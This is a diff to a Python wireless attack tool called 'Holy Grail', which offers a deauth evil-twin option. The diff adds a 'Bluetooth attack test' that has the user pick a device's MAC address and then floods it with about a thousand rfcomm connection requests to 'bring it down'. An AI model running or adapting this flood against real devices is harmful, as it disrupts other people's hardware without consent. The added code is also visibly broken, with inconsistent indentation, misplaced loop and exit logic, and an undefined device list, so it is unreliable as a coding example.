@@ -1,12 +1,13 @@
 # Excalibure Security Company's "Holy Grail"
 
-
+# need to pip install pybluez2
+from bluetooth import *
 import os
 import time
 import scapy
 import subprocess
 
-options = ['Deauth evil twin test','Bluetooth','Settings', 'Clear']
+options = ['Deauth evil twin test','Bluetooth attack test','Settings', 'Clear']
 Soptions = ['Connect to network','Logs','Back', 'Clear']
 net_inf = 'wlan0'
 APSSID = subprocess.check_output('iwgetid -r',shell=True).decode().strip()
@@ -57,8 +58,24 @@ def DETT():
 
 # 
 def BAT(): 
-	print('Test2')
-	Home()
+	# have user pick one
+	found = False
+	while(found == False):
+        	print("List of discovered devices:")
+        	print(devList)
+        	mAddr = input("Please pick a MAC Address from the above devices, or type exit to cancel: ")
+        for uInput in devList:
+        	if(uInput == mAddr):
+                	found = True
+		if(mAddr == "exit"):
+                Home()
+
+    # once found, bring it down by sending 1000 connection requests
+    cmd=['rfcomm', 'connect', mAddr, '1']
+    for i in range(0, 1001):
+        subprocess.call(cmd)
+        print('Connecting...')
+    Home()
 
 
 # Goes to the settings menue
@@ -86,7 +103,5 @@ def settings():
 print("Welcome to the Holy Grail!");
 time.sleep(3)
 os.system('clear')
-#print(APMac)
-#print(APSSID)
 Home()
 
